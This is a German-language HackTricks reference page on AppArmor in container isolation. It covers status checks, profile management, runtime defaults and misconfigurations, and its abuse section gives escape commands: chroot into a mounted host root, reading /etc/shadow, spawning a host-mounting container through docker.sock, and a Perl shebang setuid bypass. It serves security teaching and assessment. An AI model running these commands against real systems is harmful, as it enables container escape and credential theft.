# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

AppArmor ist ein **Mandatory Access Control**-System, das Einschränkungen über Profile pro Programm anwendet. Im Gegensatz zu traditionellen DAC-Prüfungen, die stark von Benutzer- und Gruppenbesitz abhängen, ermöglicht AppArmor dem kernel, eine Richtlinie durchzusetzen, die dem Prozess selbst zugeordnet ist. In Container-Umgebungen ist das wichtig, weil eine Workload möglicherweise genug traditionelle Privilegien hat, um eine Aktion zu versuchen, und trotzdem abgewiesen wird, weil ihr AppArmor-Profil den relevanten Pfad, Mount, Netzwerkverhalten oder die Nutzung von capabilities nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor **pfadbasiert** ist. Es bewertet Dateisystemzugriffe anhand von Pfadregeln statt anhand von Labels, wie es SELinux tut. Das macht es zugänglich und mächtig, bedeutet aber auch, dass bind mounts und alternative Pfadlayouts besondere Aufmerksamkeit verdienen. Wenn derselbe Host-Inhalt über einen anderen Pfad erreichbar wird, kann die Wirkung der Richtlinie anders ausfallen, als der Betreiber zunächst erwartete.

## Rolle in der Container-Isolation

Container-Sicherheitsprüfungen hören oft bei capabilities und seccomp auf, aber AppArmor bleibt auch nach diesen Prüfungen relevant. Stellen Sie sich einen Container vor, der mehr Privilegien hat, als er haben sollte, oder eine Workload, die aus betrieblichen Gründen eine zusätzliche capability benötigt. AppArmor kann weiterhin Dateizugriffe, Mount-Verhalten, Netzwerkzugriffe und Ausführungsmuster so einschränken, dass offensichtliche Missbrauchspfade verhindert werden. Deshalb kann das Deaktivieren von AppArmor "nur damit die Anwendung funktioniert" eine lediglich riskante Konfiguration stillschweigend in eine aktiv ausnutzbare verwandeln.

## Lab

Um zu prüfen, ob AppArmor auf dem Host aktiviert ist, verwenden Sie:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Um zu sehen, unter welchem Benutzer/Konto der aktuelle Prozess im Container ausgeführt wird:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Der Unterschied ist aufschlussreich. Im normalen Fall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das vom runtime gewählte Profil gebunden ist. Im unconfined-Fall verschwindet diese zusätzliche Einschränkungsebene.

Sie können auch prüfen, was Docker glaubt angewendet zu haben:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Laufzeitnutzung

Docker kann ein Standard- oder benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann sich ebenfalls mit AppArmor auf AppArmor-basierten Systemen integrieren, obwohl auf SELinux-first-Distributionen das andere MAC-System oft im Vordergrund steht. Kubernetes kann AppArmor-Richtlinien auf Workload-Ebene auf Nodes offenlegen, die AppArmor tatsächlich unterstützen. LXC und verwandte system-container-Umgebungen der Ubuntu-Familie nutzen AppArmor ebenfalls intensiv.

Der praktische Punkt ist, dass AppArmor kein "Docker feature" ist. Es ist ein Feature des Host-Kernels, das mehrere Runtimes anwenden können. Wenn der Host es nicht unterstützt oder die Runtime angewiesen wird, unconfined zu laufen, ist der vermeintliche Schutz nicht wirklich vorhanden.

Auf Docker-fähigen AppArmor-Hosts ist das bekannteste Default-Profil `docker-default`. Dieses Profil wird aus Mobys AppArmor-Template generiert und ist wichtig, weil es erklärt, warum einige capability-basierte PoCs in einem Default-Container immer noch fehlschlagen. Grob gesagt erlaubt `docker-default` normales Networking, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert den Zugriff auf sensitive Teile von `/sys`, blockiert Mount-Operationen und schränkt ptrace so ein, dass es kein allgemeines Werkzeug zur Host-Erkundung ist. Das Verständnis dieser Basislinie hilft zu unterscheiden zwischen "der Container hat `CAP_SYS_ADMIN`" und "der Container kann diese Fähigkeit tatsächlich gegen die Kernel-Schnittstellen verwenden, die mich interessieren".

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` abgelegt. Eine gängige Namenskonvention besteht darin, die Schrägstriche im ausführbaren Pfad durch Punkte zu ersetzen. Beispielsweise wird ein Profil für `/usr/bin/man` häufig als `/etc/apparmor.d/usr.bin.man` gespeichert. Dieses Detail ist sowohl bei der Verteidigung als auch bei der Bewertung wichtig, denn sobald man den aktiven Profilnamen kennt, kann man die entsprechende Datei auf dem Host oft schnell finden.

Nützliche Befehle zur Verwaltung auf dem Host sind:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Der Grund, warum diese Befehle in einer container-security-Referenz wichtig sind, ist, dass sie erklären, wie profiles tatsächlich erstellt, geladen, in complain mode versetzt und nach Änderungen an der Anwendung angepasst werden. Wenn ein Betreiber die Angewohnheit hat, profiles während der Fehlersuche in complain mode zu versetzen und vergessen, enforcement wiederherzustellen, kann der Container in der Dokumentation geschützt aussehen, sich in der Realität aber deutlich lockerer verhalten.

### Erstellen und Aktualisieren von Profiles

`aa-genprof` kann das Verhalten einer Anwendung beobachten und interaktiv dabei helfen, ein profile zu erzeugen:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kann ein Vorlagenprofil erzeugen, das später mit `apparmor_parser` geladen werden kann:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wenn sich das binary ändert und die policy aktualisiert werden muss, kann `aa-logprof` die in den logs gefundenen denials erneut abspielen und den Operator dabei unterstützen, zu entscheiden, ob sie erlaubt oder abgelehnt werden sollen:
```bash
sudo aa-logprof
```
### Protokolle

AppArmor-Verweigerungen sind oft sichtbar über `auditd`, syslog oder Tools wie `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Das ist operativ und offensiv nützlich. Verteidiger nutzen es, um Profile zu verfeinern. Angreifer nutzen es, um herauszufinden, welcher genaue Pfad oder welche Operation verweigert wird und ob AppArmor die Komponente ist, die eine exploit chain blockiert.

### Die genaue Profil-Datei identifizieren

Wenn eine Runtime einen bestimmten AppArmor-Profilnamen für einen Container anzeigt, ist es oft nützlich, diesen Namen auf die Profil-Datei auf der Festplatte zurückzuverfolgen:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Das ist besonders nützlich bei einer Host-seitigen Überprüfung, weil es die Lücke schließt zwischen "der Container gibt an, er läuft unter dem Profil `lowpriv`" und "die eigentlichen Regeln liegen in dieser spezifischen Datei, die geprüft oder neu geladen werden kann".

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen ihn häufig beim Debuggen einer Anwendung, die fehlgeschlagen ist, weil das Profil etwas Gefährliches oder Unerwartetes korrekt blockiert hat. Bleibt die Option in der Produktion bestehen, wurde die gesamte MAC-Schicht faktisch entfernt.

Ein weiteres subtileres Problem ist die Annahme, dass bind mounts harmlos sind, weil die Dateiberechtigungen normal aussehen. Da AppArmor auf Pfaden basiert, kann das Offenlegen von Host-Pfaden unter alternativen Mount-Standorten schlecht mit Pfadregeln interagieren. Ein dritter Fehler besteht darin zu vergessen, dass ein Profilname in einer Konfigurationsdatei wenig bedeutet, wenn der Host-Kernel AppArmor nicht tatsächlich durchsetzt.

## Missbrauch

Wenn AppArmor fehlt, können Operationen, die zuvor eingeschränkt waren, plötzlich funktionieren: sensitive Pfade durch bind mounts lesen, auf Teile von procfs oder sysfs zugreifen, die eigentlich schwerer zugänglich bleiben sollten, mount-bezogene Aktionen durchführen, wenn capabilities/seccomp dies ebenfalls erlauben, oder Pfade verwenden, die ein Profil normalerweise verweigern würde. AppArmor ist oft der Mechanismus, der erklärt, warum ein capability-based breakout attempt auf dem Papier "should work", in der Praxis aber dennoch fehlschlägt. Entfernt man AppArmor, kann derselbe Versuch anfangen zu funktionieren.

Wenn Sie vermuten, dass AppArmor das Haupthindernis für eine path-traversal-, bind-mount- oder mount-basierte Missbrauchskette ist, besteht der erste Schritt gewöhnlich darin, zu vergleichen, was mit und ohne Profil zugänglich wird. Zum Beispiel: Wenn ein Host-Pfad innerhalb des Containers gemountet ist, beginnen Sie damit zu prüfen, ob Sie ihn traversieren und lesen können:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Wenn der Container außerdem über eine gefährliche Capability wie `CAP_SYS_ADMIN` verfügt, ist einer der praktischsten Tests, ob AppArmor das Blockieren von mount-Operationen oder den Zugriff auf sensible Kernel-Dateisysteme steuert:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In Umgebungen, in denen ein Host-Pfad bereits über einen bind mount verfügbar ist, kann der Verlust von AppArmor ein nur-lesbares Informationsoffenlegungsproblem in direkten Host-Dateizugriff verwandeln:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Der Punkt dieser Befehle ist nicht, dass AppArmor allein den breakout verursacht. Vielmehr ist es so, dass sobald AppArmor entfernt wird, viele filesystem- und mount-basierte abuse paths sofort testbar werden.

### Vollständiges Beispiel: AppArmor deaktiviert + Host Root gemountet

Wenn der Container das Host-Root bereits bei `/host` bind-mounted hat, kann das Entfernen von AppArmor einen blockierten filesystem abuse path in einen vollständigen host escape verwandeln:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sobald die shell über das Host-Dateisystem ausgeführt wird, hat die workload effektiv die container boundary verlassen:
```bash
id
hostname
cat /etc/shadow | head
```
### Vollständiges Beispiel: AppArmor deaktiviert + Runtime Socket

Wenn die eigentliche Barriere AppArmor um den Runtime-Zustand war, kann ein gemounteter Socket für eine vollständige Escape ausreichen:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Der genaue Pfad hängt vom Mount-Punkt ab, aber das Endergebnis ist dasselbe: AppArmor verhindert nicht mehr den Zugriff auf die Runtime-API, und die Runtime-API kann einen Host-kompromittierenden Container starten.

### Vollständiges Beispiel: Path-Based Bind-Mount Bypass

Da AppArmor pfadbasiert ist, schützt das Absichern von `/proc/**` nicht automatisch denselben procfs-Inhalt des Hosts, wenn dieser über einen anderen Pfad erreichbar ist:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
### Vollständiges Beispiel: Shebang Bypass

AppArmor-Richtlinie zielt manchmal auf einen Interpreter-Pfad ab, ohne die Skriptausführung durch shebang-Verarbeitung vollständig zu berücksichtigen. Ein historisches Beispiel war ein Skript, dessen erste Zeile auf einen durch AppArmor eingeschränkten Interpreter zeigte:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Dieses Beispiel ist wichtig als Erinnerung daran, dass die Absicht eines Profils und die tatsächliche Ausführungssemantik auseinanderfallen können. Beim Überprüfen von AppArmor in Container-Umgebungen verdienen Interpreter-Ketten und alternative Ausführungspfade besondere Aufmerksamkeit.

## Prüfungen

Ziel dieser Prüfungen ist es, drei Fragen schnell zu beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt, und hat die Runtime tatsächlich ein Profil auf diesen Container angewendet?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Was hier interessant ist:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert die Workload nicht von AppArmor-Einschränkung.
- Wenn `aa-status` AppArmor als disabled oder not loaded anzeigt, ist jeder Profilname in der Runtime-Konfiguration größtenteils kosmetisch.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes custom profile anzeigt, ist das oft der Grund, warum ein filesystem- oder mount-basierter abuse path funktioniert.

Wenn ein Container bereits aus operationalen Gründen erhöhte Privilegien hat, macht das Eingeschaltetlassen von AppArmor oft den Unterschied zwischen einer kontrollierten Ausnahme und einem wesentlich größeren Sicherheitsversagen.

## Runtime-Standardeinstellungen

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Schwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig auf AppArmor-fähigen Hosts aktiviert | Verwendet das AppArmor-Profil `docker-default`, sofern nicht überschrieben | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Vom Host abhängig | AppArmor wird über `--security-opt` unterstützt, aber die genaue Voreinstellung hängt vom Host/Runtime ab und ist weniger universell als Dockers dokumentiertes `docker-default`-Profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, ist der Standard `RuntimeDefault`, aber dieser wird nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O unter Kubernetes | Richtet sich nach Node/Runtime-Unterstützung | Gängige von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Node-Unterstützung und den Einstellungen der Workload ab | Wie in der Kubernetes-Zeile; direkte Runtime-Konfiguration kann AppArmor ebenfalls komplett umgehen |

Für AppArmor ist oft der **Host** die wichtigste Variable, nicht nur die Runtime. Eine Profil-Einstellung in einem Manifest erzeugt keine Einschränkung auf einem Node, auf dem AppArmor nicht aktiviert ist.
